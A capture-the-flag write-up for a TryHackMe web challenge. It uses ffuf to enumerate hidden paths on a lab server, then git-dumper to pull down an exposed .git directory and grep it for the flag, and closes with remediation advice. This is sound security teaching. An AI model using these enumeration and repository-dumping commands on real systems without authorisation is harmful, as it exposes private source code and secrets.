# TryHackMe — Hacker Holidays 2026
## Day 2: [Room 404](https://tryhackme.com/room/hh-room404-804573bf)

**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Web - Directory Enumeration  
**Difficulty:** Very Easy

---

## Description

He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.

---

## Reconnaissance

The target web service on port 8080 appears minimal from the homepage, but hidden paths are expected. The objective is to dump exposed source code and recover the challenge proof from discovered files.

The root page looked clean and did not expose obvious sensitive content. Standard discovery files were checked:

- `/robots.txt` returned `404 Not Found`
- No direct hints from visible frontend paths

At this point, directory enumeration became the primary path forward.

---

## Exploitation

### Step 1 — Enumerate hidden paths

```bash
ffuf -u http://TARGET:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403
```

Output:

```text
[Status: 200, Size: 2554, Words: 337, Lines: 53, Duration: 48ms]
.git/HEAD [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 53ms]
:: Progress: [4614/4614] :: Job [1/1] :: 414 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Enumeration returned a critical hit:

- `/.git/HEAD` (HTTP 200)

This indicates an exposed Git metadata directory on the web server.

### Step 2 — Dump the exposed Git repository

If `git-dumper` is not installed:

```bash
pipx install git-dumper
# alternative:
pip install git-dumper
```

Then dump the exposed repository:

```bash
git-dumper http://TARGET:8080/.git/ room404-dump
cd room404-dump
```

Once dumped, repository history and tracked files were inspected:

```bash
git log --all --name-only --pretty=format:
README.md
app.js
index.html

git log --oneline --decorate --all
0f13550 (HEAD -> main) initial Byte Lotus guest platform
```

### Step 3 — Search dumped source for proof string

```bash
grep -Rni "THM{" .
```

Output:

```text
./README.md:6:Staging flag (remove before launch): THM{[REDACTED]}
```

The proof string was found in `README.md` (staging note left in source).

---

## Command Flag Breakdown

### `ffuf`

- `-u` → target URL template (`FUZZ` is replaced by each wordlist entry)
- `-w` → wordlist path
- `-mc` → match by HTTP status codes

### `git log`

- `--all` → include all refs/branches
- `--name-only` → show only filenames changed per commit
- `--pretty=format:` → suppress commit metadata output (custom empty format)
- `--oneline` → compact one-line commit view
- `--decorate` → show refs (e.g., branch/tag names)

### `grep -Rni "THM{" .`

- `-R` → recursive search through subdirectories
- `-n` → show line numbers
- `-i` → case-insensitive match

---

## Root Cause

The web server exposed the `.git` directory to unauthenticated users. This allowed full source reconstruction, including internal/staging artifacts that should never be publicly accessible.

---

## Remediation (Defensive Notes)

- Deny web access to `.git` and other VCS metadata directories
- Build/deploy from clean artifacts, not full development directories
- Add CI/CD checks to block accidental publication of sensitive files
- Review staging/debug content before release

